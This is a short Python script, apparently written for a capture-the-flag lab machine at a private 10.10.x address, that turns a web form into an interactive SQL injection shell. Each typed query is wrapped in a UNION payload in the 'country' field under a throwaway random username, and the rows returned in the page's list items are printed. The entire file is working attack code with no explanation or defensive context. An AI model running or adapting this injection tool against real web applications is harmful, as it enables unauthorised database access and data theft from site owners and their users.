import random
import requests
from bs4 import BeautifulSoup
from cmd import Cmd


class Term(Cmd):

    prompt = "> "

    def default(self, args):
        name = f'staphy-{random.randrange(1000000,9999999)}'
        resp = requests.post('http://10.10.11.116/',
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data={"username": name, "country": f"' union {args};-- -"})
        soup = BeautifulSoup(resp.text, 'html.parser')
        if soup.li:
            print('\n'.join([x.text for x in soup.findAll('li')]))

    def do_quit(self, args):
        return 1

term = Term()
term.cmdloop()
